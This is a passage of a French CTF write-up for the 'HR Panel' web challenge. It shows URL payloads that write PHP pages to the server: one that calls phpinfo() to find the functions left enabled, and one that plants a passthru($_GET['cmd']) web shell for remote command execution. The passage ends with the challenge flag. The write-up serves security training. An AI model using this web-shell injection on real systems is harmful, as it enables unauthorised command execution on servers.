  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/rcetest1.png" />
</p>


Cependant lorsque que l'on se rend dessus et que l'on essaye d'y exécuter la commande "ls" , rien ne se passe. 

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/rcetest1FAIL.png" />
</p>


Il est alors possible que la commande soit bloqué. Pour savoir quelles fonctions sont bloqués, on peut entre autres afficher la page d'info php avec la fonction phpinfo(). Récréons donc une nouvelle page :

```javascript
http://hr-panel.interiut.ctf/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php?pageName=info&pageContent=<?php phpinfo(); ?>
```


<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/info_php.gif" />
</p>


<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/5ce457a34d1e24919aa33ef7cf09532557da357e/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/disabledfunction.png" />
</p>

On peut y apercevoir qu'une grande partie des fonctions permettant de faire executé du code dans le backend sont bloqués, hormis popen() et passthru().
Utilisons donc cette dernière et naviguons à travers les fichiers du serveur afin d'y trouver un fichier intéressant  :

```javascript
http://hr-panel.interiut.ctf/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php?pageName=helloRCE&pageContent=<?php passthru($_GET["cmd"]); ?>
```

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/5ce457a34d1e24919aa33ef7cf09532557da357e/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/rce.gif" />
</p>

<p align="center">
  <b>FLAG 3 : CTFIUT{f4560bf653f0f452848e638d25c83583e50d01f031d384169fc1438673eb6ebc}</b>
</p>

